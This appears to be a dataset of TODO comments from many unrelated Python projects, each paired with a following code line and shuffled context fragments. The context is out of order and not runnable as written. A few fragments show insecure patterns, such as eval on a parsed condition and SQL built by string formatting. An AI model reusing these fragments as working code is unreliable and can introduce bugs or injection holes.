# todo: shouldn't this be the other way around?! </s> self.assertequal(len(parsed), 0)	test_parser_simple_link w = WMLParser( response ) re, parsed = w.get_references() self.assertEqual(u'http://www.w3af.com/index.aspx', re[0].url_string)
# todo: for backward compatibility only, remove if not used anymore </s> def get_project_id(self):	get_project_id return get_project(key='id')
# todo: implement smarter approach to merging </s> else:	treat u'A claim for %s already exists. Skipping' % claim.getID()) if claim.type == 'wikibase-item': match = re.search(pywikibot.link_regex, value)
# todo: we may want to log this as soon as mobile ucr stops hitting this </s> if not isinstance(report_filter, dynamicchoicelistfilter):	get_choices_from_data_source_column def get_choices_from_data_source_column(data_source, report_filter, search_term=None, limit=20, page=0): return [] adapter = IndicatorSqlAdapter(data_source)
# todo: base on ssa instead. </s> needs_check = generator.decidevariableneedscheck(variable),	_generateExpressionCode to_name     = to_name, variable    = variable, emit        = emit, context     = context
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo: hack so every disk is not synced independently during boot </s> if os.path.exists('/tmp/.sync_disk_done'):	_event_devfs if not RE_ISDISK.match(data['cdev']): return middleware.call('notifier.sync_disks') middleware.call('notifier.multipath_sync')
# todo: perhaps we might merge (without duplicates) </s> if aggregates and measures:	prepare_aggregates If no aggregates are specified then all cube's aggregates are returned. Either specify `aggregates` or `measures`, not both. """ raise ArgumentError("Only aggregates or measures can be " "specified, not both")
# todo: is there a way to do this without eval?  eval allows arbitrary </s> if eval(cond, namespace, {}):	select_lines cond = m.group(3) try: lines.append(m.group(1) + trailing_quote) except:
# todo: https://github.com/turicas/brasil.io/issues/209 </s> return file	clean_file msg = f"Formato de planilha inválida. O arquivo precisa estar formatado como {valid}." raise forms.ValidationError(msg)
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_convert = p_operation.add_parser( "convert", help="convert VGM to PCM using OPL hardware")
# todo(boris-42): make it work through assertisinstance </s> self.assertequal(str(type(engine_inst)), str(e))	test_get_engine uuid.uuid4(), {})
# todo fix redirect loop here </s> app.config['security_unauthorized_view'] = '/login'	_add_configuration_to_app app.config['SECURITY_PASSWORD_SALT'] = config.get('data_storage', 'password_salt').encode() app.config['SQLALCHEMY_DATABASE_URI'] = config.get('data_storage', 'user_database', fallback='sqlite:///') app.config['LOGIN_DISABLED'] = not config.getboolean('ExpertSettings', 'authentication') app.config['SECURITY_USER_IDENTITY_ATTRIBUTES'] = [{'email': {"mapper": uia_username_mapper, "case_insensitive": True}}]
pass # todo(denero) implement </s> def test_extra_field(self):	test_extra_field
# todo results from ml </s> return str(endpoint.metadata)	_get_device_type @staticmethod def _get_device_type(endpoint):
# todo: remove this once connexion can validate enums with openapi3. </s> if field_name and field_name not in ['info', 'action_apis', 'condition_apis', 'transform_apis', 'device_apis',	read_all_app_apis @permissions_accepted_for_resources(ResourcePermissions('app_apis', ['read'])) def __func(): 'tags', 'external_docs']: return Problem(BAD_REQUEST, 'Could not read app api.', '{} is not a valid field name.'.format(field_name))
# todo: if this is the initial load of logging config we might not </s> logger.debug('config file %s not found; skipping', filename)	_load parser.readfp(filehandle) except IOError: raw_config = {} for section in parser.sections():
f.write(self.pastie_content.encode('utf8'))  # todo error checking </s> f.close()	savePastie else: f = open(full_path, 'w')
# todo(kgriffs): uncomment when 3.0 development opens </s> self._data = none	media self._media = obj
# todo: what actually raises valueerror in the following code? </s> try:	S3ReadStream super(S3ReadStream, self).__init__(self.stream) def read(self, *args, **kwargs): result = super(S3ReadStream, self).read(*args, **kwargs) if result is None:
# todo: add a .parse() method that includes boths steps? </s> vi_cmd_data = self.parse_motion()	do_cancel_action def do_cancel_action(self): vi_cmd_data = self.parse_action(vi_cmd_data) if vi_cmd_data['must_blink_on_error']:
# todo: test coverage </s> todo = cls.objects.filter(	submit_queue @classmethod def submit_queue(cls): prepared=True, sent=False, sending=False, publish_date__lt=datetime.now()
# todo consider to use ansible's 'to_nice_yaml' from </s> with open(config_path, "w") as _f:	_dump_config def _dump_config(config_path, config_vars, default_vars): _f.write('---\n') if config_vars:
# todo: error checking </s> json_obj = json.loads(content)	list_boards headers = headers, ) return json_obj.boards
if is_v6 or self.is_direct_mode() or batch or not allow_quick:  # todo: thin mode </s> files = [opj(curdir, f) for f in files]	is_under_annex For each input file states either file is under annex is_v6 = self.config.get("annex.version") == "6" modified = self.get_changed_files() if is_v6 else []
# todo: refactor this method. </s> value = none	processTask def processTask(self, event, task, parent=None):  # noqa try: value = next(task)
print_settings["bottom_thickness"] = none  # todo; can be different per extruder & per mesh </s> data["print_settings"] = print_settings	_onWriteStarted print_settings["cool_fan_enabled"] = None  # TODO; Can be different per extruder print_settings["bottom_thickness"] = None  # TODO; Can be different per extruder & per mesh submitted_data = urllib.parse.urlencode(submitted_data) binary_data = submitted_data.encode("utf-8")
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: implement </s> record0.write('\xff' * 4)	_generate_record0 0xe8, 2, 65001, uid, 6)) record0.write('\xff' * 8) record0.write('\xff' * 28) record0.write(pack('>I',
# todo: implement </s> raise notimplementederror	use_params @contextlib.contextmanager def use_params(self, params): # pragma: no cover
# todo: make the get_closest_value to return region </s> number, number_index = self.get_closest_value(	get_current_numeric_value r'(^[^0-9]+$)', ) word_like, word_like_index,
# todo: check number of outputs is equal to the expected number </s> cache.update(zip(step.outputs, listify(output_data)))	fit else: raise TypeError('{} must implement either predict or transform!'.format(step.name))
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: remove dep on parent </s> font.disablenotifications("font.glyphorderchanged", self.parent())	pipeDropEvent self.glyphs = [glyph for glyph in self._glyphs if glyph is not None] font.glyphOrder = [glyph.name for glyph in self._glyphs] font.enableNotifications("Font.GlyphOrderChanged", self.parent())
# todo: i think this should use '$ fileregions' </s> return self.id1.get_segment(ea).bounds.start	SegStart def SegStart(self, ea):
# todo, pass complete checkpoint as state dictionary </s> mp_queue.put(best_model_path)	transfer_distrib_spawn_state_on_fit_end if self.trainer.global_rank == 0 and mp_queue is not None: rank_zero_warn('cleaning up ddp environment...') mp_queue.put(results) last_path = None
#todo_ismeal_quesataion: i prefer get_* for getters </s> return self.__quantum_registers[name]	quantum_registers def quantum_registers(self, name):
# todo: arrange </s> distro = self.remote.get_item_handle("distro", "testdistrocopy", self.token)	test_rename_distro def test_rename_distro(self): Test: rename a distro object result = self.remote.rename_distro(distro, "testdistro1", self.token) self.assertTrue(result)
# todo expression </s> f.write(u"todo expression")	print_Show f.write(u"show ") if stmt.imspec[1] is not None: # Expression else: # Image name f.write(' '.join(stmt.imspec[0]))
# todo: check for error 'toomanyregistrationsfortargetid' </s> rule = fakerule(listener.arn, conditions, priority, actions, is_default=false)	create_rule raise PriorityInUseError() self._validate_actions(actions) listener.register(rule) return [rule]
# todo(b/160795287): deprecate estimator based executor. </s> fn_args_dict = fn_args.get_dict()	run_fn fn_args: Holds args used to train the model as name/value pairs. schema = io_utils.parse_pbtxt_file(fn_args.schema_file, schema_pb2.Schema()) fn_args_dict['serving_model_dir'] = os.path.join(fn_args.model_run_dir, path_utils.SERVING_MODEL_DIR)
# todo: 'package' won't work with unpack() </s> filename = u.path.rsplit('/', 1)[-1] or 'package'	get_download_data else: md5 = '' return (data, pypiurl, filename, md5)
# todo(ruoyu): deprecate this in favor of pre_execution once migration to </s> return exec_properties	resolve_exec_properties exec_properties['blessed_model']))
# todo: custom gremlin method </s> pass	create_edge_label def create_edge_label(self, label):
# todo: unit-test this method. </s> return self.unicode(text, encoding)	read text = f.read()
# todo: what could go wrong here? </s> msg = outgoingmessage(connection, message_body)	_send_message def _send_message(self, connection, message_body): return msg.send()
# todo: 重构，写到socket fd里面的都是合法的 </s> return 0	_handle_read return 0 if fd not in self._virtual_files: file = self._virtual_files[fd] logger.info("Reading %d bytes from '%s'" % (count, file.name))
#todo: check the data! </s> count = 0	test_submodule_loop pipe_def = self._get_pipe_def("pipe_b3d43c00f9e1145ff522fb71ea743e99.json") p = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def) for i in p: count += 1
# todo: to be implemented </s> raise notimplementederror()	get_cluster_capacity scheduler = get_cfn_param(stack.get("Parameters", []), "Scheduler") if scheduler == "slurm": return ( get_batch_ce_capacity(stack_name)
# todo: get rid of warnings </s> assert_equal(expected_html, result.value)	endnotes_are_appended_to_text with open(test_path("endnotes.docx"), "rb") as fileobj: result = mammoth.convert_to_html(fileobj=fileobj, generate_uniquifier=lambda: 42)
# todo: remove parametrized workaround once collection structure contains parametrization. </s> if x.name == names[0] or x.name.split("[")[0] == names[0]:	matchnodes has_matched = False for x in rep.result: result.extend(self.matchnodes([x], names[1:])) has_matched = True
# todo numberpadding? </s> s = s + '0' * (1 + exp - len(s))	apply_makeboxes_n if len(s) < exp + 1: evaluation.message('NumberForm', 'sigz') if exp <= 0: s = '0' * (1 - exp) + s
# todo: order matters? </s> w = np.sum(w, axis=1)	get_boundaries W[:, :] = 0 W[max_idx] = idx + 1 W = median_filter(W[:, np.newaxis], 11) b = np.where(np.diff(W.flatten()) != 0)[0] + 1
# todo: must be implemented </s> pass	get_novel_url def get_novel_url(self):
# todo: differentiate wrt some inputs only </s> ans1, deriv1 = jvp_fd(fun, vals, directions)	jvp_matches_fd directions = gen_inputs(fun) fun = partial(eval_fun, fun) ans2, deriv2 = jvp(fun, vals, directions) check_all_close(ans1, ans2)
pass # todo </s> def handle_request(self, input):	handle_request
):  # todo? this equates the outputs </s> mod_kwargs += [	write_pipe pipe_wire['tgt']['id'] != '_INPUT' and pipe_wire['src']['id'].startswith('_OUTPUT') ( util.pythonise(pipe_wire['tgt']['id']),
# todo: also use backward pass </s> h = fw	get_basic_model ) fw = states[0][1] logits_flat = tf.contrib.layers.linear(h, 5*target_size) logits = tf.reshape(logits_flat, [-1, 5, target_size])
# todo: test me @jmcarp </s> admins = [	manage_contributors if user not in users ] user for user in users if self.has_permission(user, 'admin')
# todo: implement this, mandatory </s> def _predict(self, x):	_predict core logic Parameters
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_min_weight_magnitude_too_small def test_fail_min_weight_magnitude_too_small(self): ``min_weight_magnitude`` is < 18.
# todo test not just the 'starts with </s> raise usageerror(	parseArgs application_config = safe_load(application_config) except YAMLError as e: "Application config could not be parsed as YAML:\n\n" + str(e) )
else: # todo: find all defaults location for .wine , or request it directely to the user if not found. </s> installer = "wine /root/.wine/drive_c/python27/python.exe /root/.wine/drive_c/python27/scripts/pyinstaller-script.py"	PyInstaller if sys.platform == "darwin": # On osx, the default .wine directory is located on $HOME/.wine/ installer = "wine " + os.environ['HOME'] + "/.wine/drive_c/Python27/python.exe " + os.environ['HOME'] + "/.wine/drive_c/Python27/Scripts/pyinstaller-script.py" p = subprocess.Popen( installer + " -h",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE ) x = p.stdout.read().decode()
# todo not sure from here, did not found variables inside the emulator </s> "dwnumberofprocessors": 0x4.to_bytes(length=4, byteorder='little'),	hook_GetSystemInfo byteorder='little'), "dwActiveProcessorMask": 0x3.to_bytes(length=ql.pointersize, byteorder='little'), "dwProcessorType": 0x24a.to_bytes(length=4, byteorder='little'), "dwAllocationGranularity": (ql.heap.page_size * 10).to_bytes(length=4, byteorder='little'),
# todo: add compute method </s> def build_outputs(self, inputs):	LogisticRegression class LogisticRegression(ProcessorMixin, sklearn.linear_model.logistic.LogisticRegression): return Data((1,), self)
# todo: add multi_log_processor </s> def __init__(	LogEmitter class LogEmitter: self, resource: Resource,
# todo implement this effectively </s> print('run safety')	security_scan print('run bandit')
# todo find out if this is good because of sparcity... </s> 'prefers_data_normalized': false,	get_properties 'handles_numerical_features': True, 'prefers_data_scaled': False, 'handles_regression': True, 'handles_classification': False,
# todo: it's broken </s> console = settings.pop("console", none)	load name = settings.pop("name") path = settings.pop("path") self.updated_signal.connect(self._updatePortSettings)
# @todo: "smart" & ssh keys for non-localhost </s> "connection": "local",	setup_settings_apply }) playbook = [{"hosts": host, "remote_user": remote_user, "become_method": "sudo",
#@todo: remove in 0.4.10 </s> def error(self, reason=none, type="parse"):	error raise Fail("%s error%s | Plugin out of date" % (type.capitalize(), ':' + str(reason) if reason else "")) if self.core.debug:
# todo: remove in v8 </s> if 'retired' in self._tags[lang]:	__init__ is_draft = True self._tags[lang].remove('draft') is_private = True LOGGER.warning('The "retired" tag in post "{0}" is now deprecated and will be removed in v8.  Use "private" instead.'.format(self.source_path))
# todo: if empty, add 'pass' </s> except:	uncompyle_find if ast[-1] == walker.RETURN_NONE: ast.pop() # remove last node pass walk.mod_globs = walker.find_globals(ast, set())
# todo(bcipolli): add a link, with querystring args that auto-checks this video in the topic tree </s> messages.warning(request, _("this video was not found! you can download it by going to the update page."))	video_handler if not video_exists: if request.is_admin: elif request.is_logged_in: messages.warning(request, _("This video was not found! Please contact your teacher or an admin to have it downloaded."))
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# self.todolist was loaded with old identifier settings </s> todolist = load_file_to_todolist("test/data/listcommandtest.txt")	test_list50 default alphabet. config(p_overrides={('topydo', 'identifier_alphabet'): 'a', ('topydo', 'identifiers'): 'text'}) command = ListCommand(["-F", "%I", "Foo"], todolist, self.out, self.error) command.execute()
pass # todo </s> def send_data_to_an_engine(data,costfunc=lambda x: len(x)):	send_data_to_an_engine
# todo: make class for that </s> self.visualization.visstate.params.categoryaxes.append(	some_defaults "truncate": 100 }}) { "id": "CategoryAxis-1",
# todo xxx graalvm change </s> raise unittest.skiptest("missing threading support")	ThreadedEchoServer self.daemon = True def __enter__(self): self.start(threading.Event()) self.flag.wait()
# todo: syn-103: remove "origin" and "destination" keys. </s> "origin": origin,	_expect_edu "edus": [ { "destination": destination, "edu_type": edu_type,
# todo: +kwargs </s> return ret	_call_gitpy_with_progress else: ret = callable(**git_kwargs)
# todo remove when we remove dispersy </s> from tribler.community.allchannel.community import allchannelcommunity	vote_for_channel def vote_for_channel(self, cid, vote): Make a vote in the channel specified by the cid. Returns a deferred that fires when the vote is done. for community in self.session.get_dispersy_instance().get_communities(): if isinstance(community, AllChannelCommunity):
# todo yoon </s> try:	train_lm chars = " ".join(truncated_sent) f.write(chars+'\n') rev_lm = train_rnnlm(kenlm_path=args.kenlm_path, data_path=save_path,
## todo other builtins prototype hacks. see above. </s> header = [	__init__ def __init__(self, src, extras):  ## note src is an array print 'creating blob' 'Array.prototype.append = function(a) {this.push(a);};', ]
# todo: can be removed in v0.2.19 </s> self.hero.bag._remove_all_quest_artifacts()	ActionIdlenessPrototype if self.percents >= 1.0: self.state = self.STATE.QUEST quest = create_random_quest_for_hero(self.hero) ActionQuestPrototype.create(hero=self.hero, quest=quest)
# todo: fix </s> from .numpy_ops import numpyops	hash def hash(self, ids: Array, seed: Array) -> Array: numpy_ops = NumpyOps() return self.asarray(
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_transfers_contents_invalid def test_fail_transfers_contents_invalid(self): ``transfers`` is a non-empty array, but it contains invalid values.
return "" # todo: followup after decision around returning none </s> unix_time = unix_time - 11644473600	helper_exit_time unix_time = self.ExitTime.QuadPart // 10000000 if unix_time == 0: return str(datetime.datetime.utcfromtimestamp(unix_time))
# todo: figure out exact thresholds to use here </s> if cmin > nmax or cmax < 0:	_get_reprojected_image cmin, cmax = coord.min(), coord.max() nmax = self.layer.shape[icoord] return np.ones(pixel_coords[0].shape) * np.nan cmin = max(0, cmin)
#todo: fix this off-by-one when materials become 0-indexed </s> bins = (c_int32*n)(*(m._index-1 for m in materials))	bins def bins(self, materials): n = len(materials) _dll.openmc_material_filter_set_bins(self._index, n, bins)
raise skiptest  # todo: figure out why this randomly started failing. </s> qs = {'a': 1, 'w': 4, 'format': 'json', 'thread_type': 1, 'forum': 1}	test_discussion_filter_sticky def test_discussion_filter_sticky(self): response = self.client.get(reverse('search'), qs) result = json.loads(response.content)['results'][0]
pass  # todo </s> while not ale.game_over():	step def step(self, action): reward = ale.act(a) observation, reward, done, _ = self.env.step(action)
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
# todo_recorders - need to pass in parent info instead of none </s> metadata = create_local_meta(none, 'scipyiterativesolver')	_monitor from openmdao.recorders.base_recorder import push_recording_iteration_stack, pop_recording_iteration_stack push_recording_iteration_stack('ScipyIterativeSolver', 1) update_local_meta(metadata, (1,)) self._rec_mgr.record_iteration(self, metadata, abs=norm, rel=norm / self._norm0)
# todo: mock this test (failed in #493) </s> assert len(albums_from_artist_fixture) == 52	test_len def test_len(self, albums_from_artist_fixture):
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: this is wrong in some cases, please fix it </s> return self._parser_modified or self.subitems.modified	_get_parser_modified def _get_parser_modified(self):
# todo(jmcarp) handle multiple results better </s> committee = committee.query.filter_by(committee_id=committee_id).first()	get per_page = args.get('per_page', 20) page_data = Pagination(page_num, per_page, 1) totals_class, specific_fields = totals_model_map.get( committee.committee_type,
# todo: use a better name </s> self.r = r	CheckResultsRendererElement def __init__(self, r): super(CheckResultsRendererElement, self).__init__() @renderer def summary(self, req, tag):
# todo: also check for match *[0-9]* </s> for tag in hg_tags:	default_describe node, tag = line.split() git_tags[tag] = node if tag in git_tags: break
# todo: this is a guess. make sure this is correct. </s> sql = "limit %s" % limit	get_limit_offset_sql def get_limit_offset_sql(limit, offset=None): if offset and offset != 0: sql += " OFFSET %s" % offset
# todo: should this raise? </s> return none	tabular_data_repository if url: return pywikibot.Site(url=url, user=self.username())
raise notimplementederror()  # todo: fix </s> language_model = decode.lm(dl.y_train, dl.output_dim, order=2)	evaluate probs = get_ensemble_pred_probs(args.model_paths, x) if args.decode is True: predictions = np.array([decode.beam_search(prediction, language_model) for prediction in tqdm(probs)])
# todo: do_cert? </s> return data	run_sslyze weakest_dh = None data['config']['weakest_dh'] = weakest_dh
# \todo we didn't return `unicode` here because </s> return self._qtwidget().text().encode( "utf-8" )	getText return self._qtWidget().text() else :
# todo this help should be modified in case of webaccs. </s> cls.echo('$ gandi vhost update %s --ssl --private-key %s' %	activate_ssl cls.echo('$ gandi certificate follow %s' % oper['id']) cls.echo("And when it's DONE you can continue doing :") (vhost, vhost.replace('*.', 'wildcard.') + '.key')) cls.echo('Creating the certificate for %s%s' %
# todo: update this to support categorical </s> for j in range(self.m):	_alphas Note: As an internal function, returns torch.Tensor. alphas = self.mu.detach() / self._betas().repeat(2,1).t() if self.polarity[j] != 1: row = alphas[j].numpy().copy()
#todo - use sql for this, much more efficient! </s> return len(self.adaptor.list_biodatabase_names())	DBServer return BioSeqDatabase(self.adaptor, name) def __len__(self): def __contains__(self, value): return value in self.adaptor.list_biodatabase_names()
# todo: this here to avoid having to manually clean up after </s> if self.date < datetime(2015, 8, 25):	_remove_case self.case_ids_on_phone.remove(to_remove) except KeyError: _assert = soft_assert(to=['czue' + '@' + 'dimagi.com'], exponential_backoff=False) _assert(False, 'patching sync log {} to remove missing case ID {}!'.format(self._id, to_remove))
# todo: waffle here </s> index_answers.delay([instance.id])	update_answer_in_index if not settings.USE_ELASTIC or kw.get('raw'): return
# todo: show deprecation message in the future. </s> loaded_extensions.extend(	list_jinja_extensions raise loaded_extensions.append(value) self.extensions_controller.trigger('jinja_extensions')) return loaded_extensions
raise notimplementederror #todo </s> elif q.kw(i,"format"):	parse while i < l: if q.kw(i,"RETURN"): raise NotImplementedError #TODO elif q.kw(i,"REQUEST"):
# todo: re-enable after server bug is fixed </s> assert dict(rel) == {"since": 1999}	test_can_return_relationship assert rel.type == "KNOWS"
# todo: try wrapping idapython_execscript in a safe handler instead </s> idaapi.idapython_execscript(script, vars)	start_server old_cwd = os.getcwd() os.chdir(new_cwd) print("hi") os.chdir(old_cwd)
# todo: throw special accessdeniederror </s> raise valueerror('tbw not admin')	assert_request_user_is_admin is_admin = request_user_is_admin(request=request) if not is_admin:
# todo: remove the duplicate entry for config_name, by </s> update['config_name'] = master_namespace	rewrite_config if not namespace: namespace = MASTER_NAMESPACE original[namespace] = update with open(filepath, 'w') as config:
# todo: add support for windows </s> raise notimplementederror("windows support is not implemented")	_run_script def _run_script(build_name): if sys.platform == "win32" or sys.platform == "cygwin": else: command = ["sh", f"build_{build_name}.sh"]
#todo : manage more than just quit </s> def manage_signal(self, sig, frame):	Satellite print "Allocate : ", w.id self.workers[w.id].start() print "\nExiting with signal", sig for w in self.workers.values():
# todo: - torch.abs(h_emb + r_emb - t_emb) </s> score = - torch.sum(torch.abs(h_emb + r_emb - t_emb))	calc_score :param t_emb: :return: return score
# todo do we actually need to round here? </s> return round(dist, config.precision)	small_phi_measure else: validate.measure(config.MEASURE)
# todo: properly parse </s> for v in values:	DefaultAttributeHandler self._layout = FloatingLayout() self._buttons = {} self.addValue(v) self.setLayout(self._layout)
self.mapping = create_mapping() # todo: optimize by focusing only on this new test </s> else:	_file_created def _file_created(self, path): if basename(path).startswith("test_"): pass
# todo: use shlex.quote as soon as a newer python version is available. </s> quoted_file_path = pipes.quote(file_path)	check_file def check_file(self, file_path): rvm_cmd = os.path.expanduser('~/.rvm/bin/rvm-auto-ruby') rubocop_cmd = rvm_cmd + ' -S rubocop ' + quoted_file_path self.run_shell_command(rubocop_cmd)
# todo(leofang): how about ptds? </s> assert stream == self.stream.ptr	test_value_type assert (stream is None) or isinstance(stream, int) if isinstance(stream, int):
# todo remove this asap, as soon as the test has been fixed </s> if self.is_running_on_public_ci():	test_broken_connectivity @attr('disconnected') def test_broken_connectivity(self): self.skipTest("Too buggy to run on public CI") self._create_data(metadata=gen_metadata, size=1025*1024)
# todo remove? </s> yield key_stmt[0].name, value_stmt	iterate yield call.name, value_stmt else: else: if stmt.assignment_details:
#set limit to 25 --> currently hardcoded --> todo: add a setting for this ? </s> subelement(root, "limit").text = "25"	addVideoNodesForTag SubElement(Rule, "value").text = tagname SubElement(root, "order", {"direction":"descending"}).text = "dateadded" Rule2 = SubElement(root, "rule", {"field":"playcount","operator":"is"}) SubElement(Rule2, "value").text = "0"
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_change_address_auto_generated def test_pass_change_address_auto_generated(self): Preparing a bundle with an auto-generated change address.
# todo: remove this skip after fixing </s> if sys.version[0] == 3:	test_arc_draw1 @requires_application() def test_arc_draw1(): raise SkipTest with TestingCanvas() as c:
# todo(nakago): investigate why the test fails. </s> params = ()	test_backward_cpu atom_data, adj_data, y_grad = data if int(chainer.__version__[0]) <= 2: else: params = tuple(model_no_dropout.params())
# todo - needs tests </s> def dispatch(self, request, *args, **kwargs):	dispatch if request.user.is_anonymous(): raise ImproperlyConfigured(ERROR_MSG)
# todo: assert </s> self.asserttrue(self.remote.save_repo(repo, self.token))	test_create_repo self.assertTrue(self.remote.modify_repo(repo, "mirror_locally", "0", self.token))
# todo implement. </s> raise notimplementederror	prepare_model def prepare_model(self):
# todo: optimize me </s> for citation in self.alternative_citations.all():	fork_node else: forked.title = title forked.add_citation( auth=auth,
# todo(dylan): better error handling here </s> r = requests.get(request_url)	start_subtitle_download request_url = "http://%s/static/data/subtitles/srts_by_language/%s.json" % (settings.CENTRAL_SERVER_HOST, language) try: r.raise_for_status() # will return none if 200, otherwise will raise HTTP error available_srts = set((r.json)["srt_files"])
# todo: actually test this once i figure out how to do this in py.test </s> logger.error("interrupted by user")	config_download jobs.get(0xFFFF) except KeyboardInterrupt: return 1 if config.metadata_table:
# todo add </s> pass	get_endidx def get_endidx():
# todo: seems to be doing < rather than <= ??? </s> xpath.add_post_condition("@x0 >= %s" % x0)	_xpath_in_bbox def _xpath_in_bbox(self, xpath, expr): x0,y0,x1,y1 = map(float, expr.split(",")) xpath.add_post_condition("@y0 >= %s" % y0) xpath.add_post_condition("@x1 <= %s" % x1)
# todo: warn on error </s> yield rule	find_stylesheets_rules if rule.type == 'qualified-rule':
#ng_required="false",   # todo: validation </s> data_bind='value: last_name',	NewMobileWorkerForm crispy.Field( 'last_name', ), location_field,
# todo: sort the functionality by name and by vuln class </s> for functionality_name in functionality:	create_checklist_tree root.add(DefaultMutableTreeNode("Program Brief")) root.add(DefaultMutableTreeNode("Targets")) vulns = functionality[functionality_name]["vulns"] node = DefaultMutableTreeNode(functionality_name)
# todo: reformat or delete </s> camera.trackbodyid = 0	sawyer_xyz_reacher_camera def sawyer_xyz_reacher_camera(camera): camera.distance = 1.0 cam_dist = 0.3
# todo: handle other file operations other than just extend/write </s> self.send_event('added', fields={'data': f.read()})	run if not events: continue
# todo testing </s> sys.stdout.write('attempting to establish bacnet cov sub')	establish_cov_subscription def establish_cov_subscription(self, point_name, lifetime, renew): register = self.get_register_by_name(point_name) try:
# todo tell it to some human operator </s> pass	__init__ self._store[ent[:-5]] = entity(data) except OSError: except IOError: pass
#todo: where is the set_param method?! </s> pass	test_regression_set_params_returns_self params = automl.get_params()
# todo: implement me </s> loss = criterion(depth, image)	_test_smoke criterion = tgm.losses.DepthSmoothnessLoss()
# todo find a better way of checking for no pregenerated thresholds </s> self.code_gen_dict["$globals$"] += '#include "thresh.h" \n'	global_includes self.code_gen_dict["$GLOBALS$"] += '#include "params.h" \n' if self.TMEM != 0:
self.current_height = self.current_height * 2 #todo </s> return nn.sequential(*layers)	layer_resize_conv self.current_channels = channels self.current_width = self.current_width * 2 #TODO
# todo: remove in ros 1.3 </s> return hostkeyentry(names, key)	_paramiko_HostKeyEntry_from_line return None
pass # todo </s> def test_radio_input(self):	test_radio_input
# todo: python-components: for now, we call each preprocessor's graph_fn directly. </s> if self_.backend == "python" or get_backend() == "python":	method def method(self_, *inputs): result = inputs for sub_component in self_.sub_components.values(): result = getattr(sub_component, "_graph_fn_"+components_api_method_name)(*force_tuple(result))
# todo only return results within uri roots given by ``uris`` </s> if query is none:	find_exact def find_exact(self, query=None, uris=None): query = {} self._validate_query(query)
# todo(gibi): remove this when live migration is fully supported and </s> self._turn_off_api_check()	test_live_migrate_with_qos_port_pci_update_fails def test_live_migrate_with_qos_port_pci_update_fails(self): rsp = self.placement_api.put( '/resource_providers/%s'
# todo: remove in sopel 8 </s> if 'url_callbacks' not in self.memory:	__setup_plugins_check_manual_url_callbacks def __setup_plugins_check_manual_url_callbacks(self, name): return for key, callback in tools.iteritems(self.memory['url_callbacks']):
# todo: we should filter out some of these columns </s> expected_property_names = [	test_reference_for_cases self.domain, self.app, DATA_SOURCE_TYPE_RAW, case_data_source._id, ) "doc_id", "inserted_at", "name", "case_type", "closed", "closed_by_user_id", "closed_date", "external_id", "last_modified_by_user_id", "last_modified_date", "opened_by_user_id", "opened_date",
# todo docstring </s> desired_node_applications = []	change_node_configuration def change_node_configuration(self, desired_configuration, hostname): docstring for change_node_configuration for node in desired_configuration.nodes: if node.hostname == hostname:
if func=='tag':  # todo </s> res = ""	XML_ExpandLine elif cmd.startswith('ADDPATH('): func,el,name = XML_processParams(cmd[len('ADDPATH('):], src) elif func=='attrib': res = Path_addPath(path, el.get(name,''))
# todo : include project name here! </s> filename = os.path.basename(model_file)	__project_models for (source_path, model_files) in project_sources.items(): for model_file in model_files: model_group = os.path.dirname(model_file) model_name  = os.path.splitext(filename)[0]
pass  # todo </s> while not ale.game_over():	step def step(self, action): reward = ale.act(a) observation, reward, done, _ = self.env.step(action)
#       todo: update for d4 </s> [++++, ++--, +-+-, -++-, +--+, -+-+, --++, ----]	CrystalOfSpinsPlus sage: D.list()
# todo could keep_trailing_newline fix this better? </s> f.write(b'\n')	run with open(output, 'wb') as f: f.write(rendered.encode('utf-8')) if not state.doxyfile['M_SEARCH_DISABLED']: data = build_search_data(state, add_lookahead_barriers=search_add_lookahead_barriers, merge_subtrees=search_merge_subtrees, merge_prefixes=search_merge_prefixes)
# todo: check if user has access to this topic/poll </s> poll = get_object_or_404(commentpoll, pk=pk)	vote @require_POST def vote(request, pk): form = PollVoteManyForm(user=request.user, poll=poll, data=request.POST) if form.is_valid():
# todo tell it to some human operator </s> pass	__init__ pass except IOError: except InvalidData: pass
# todo: arrange </s> repo = self.remote.new_repo(self.token)	test_create_repo def test_create_repo(self): Test: create/edit a repo object self.assertTrue(self.remote.modify_repo(repo, "name", "testrepo0", self.token)) self.assertTrue(self.remote.modify_repo(repo, "mirror", "http://www.sample.com/path/to/some/repo", self.token))
#todo do it better 21/08/13 12:36:08 </s> for s,need in tmp_cuttor.cut_to_sentence(txt):	summarize2 tmp_cuttor.set_stage1_regex(re.compile('(\d+)|([a-zA-Z]+)', re.I|re.U)) sentences = [] if need: sentences.append(s)
# todo(gibi): remove when nova only supports compute newer than </s> source_service = objects.service.get_by_host_and_binary(	_resize "microversion") raise exc.HTTPBadRequest(explanation=msg) context, instance.host, 'nova-compute') if source_service.version < MIN_COMPUTE_MOVE_BANDWIDTH:
# must remove folder or copytree fails todo: smarter version </s> shutil.rmtree(join(folder, 'php'))	prepareResourcesJS if os.path.isdir(jsPath): if self.params['JS libs'].val == 'packaged': shutil.copytree(join(jsPath, 'php'), join(folder, 'php'))
# todo: raise an invalidparameters instead and stop using cli_ui in gitlabform.gitlab </s> cli_ui.fatal(	add_ldap_group_link ) except NotFoundException: f"Invalid parameters for LDAP group link for group {group} - {data} ", exit_code=EXIT_INVALID_INPUT,
